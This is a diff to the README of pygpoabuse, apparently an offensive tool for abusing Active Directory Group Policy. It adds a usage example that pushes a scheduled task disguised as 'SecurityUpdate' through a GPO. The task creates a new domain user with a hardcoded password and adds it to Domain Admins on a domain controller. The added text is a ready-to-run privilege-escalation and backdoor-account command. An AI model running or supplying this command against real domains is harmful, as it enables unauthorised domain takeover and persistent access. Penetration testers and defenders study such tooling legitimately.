@@ -14,6 +14,11 @@ Host/User targeting via filters (mirrors SharpGPOAbuse --FilterEnabled):
   -target-user-sid SID  User task: SID of the targeted user (optional, more robust matching)
 
 ```
+### Example
+```bash
+# Add Domain user and add to Domain Admins via Domain-Controller
+python3 pygpoabuse.py red.local/user:Testing123 -gpo-id D9A65E7F-112D-49B9-AF7A-4FC2BA092BF6 -taskname SecurityUpdate  -dc-ip 192.168.152.2 -command 'net user UserGPO P@ssw0rd /add && net group "Domain Admins" UserGPO /add' -filter-enabled -target-dns-name dc01.red.local
+```
 
 ## Description
 
